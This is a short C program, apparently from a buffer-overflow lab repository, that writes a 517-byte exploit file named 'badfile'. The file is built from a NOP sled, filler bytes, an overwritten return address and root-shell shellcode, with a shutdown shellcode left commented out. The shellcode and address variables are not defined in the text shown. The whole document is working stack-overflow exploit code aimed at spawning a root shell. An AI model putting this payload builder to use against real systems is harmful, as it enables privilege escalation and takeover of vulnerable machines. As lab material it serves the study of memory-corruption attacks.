# Buffer-Overflow-attacks

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	for(int i=0;i<517;i++)
		buff[i] = nop[0];
	int ind = 0;	
	for(;ind<24;){
		buff[ind++] = 'd';
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
	ind += 64;
	//for(int i=0;i<strlen(shutdown_shellcode);i++){
	//	buff[ind++] = shutdown_shellcode[i];
	//}
	for(int i=0;i<strlen(root_shell);i++){
		buff[ind++] = root_shell[i];
	}
	buff[ind] = '\0';
	fwrite(buff,517,1,badf);
	return 0;
}
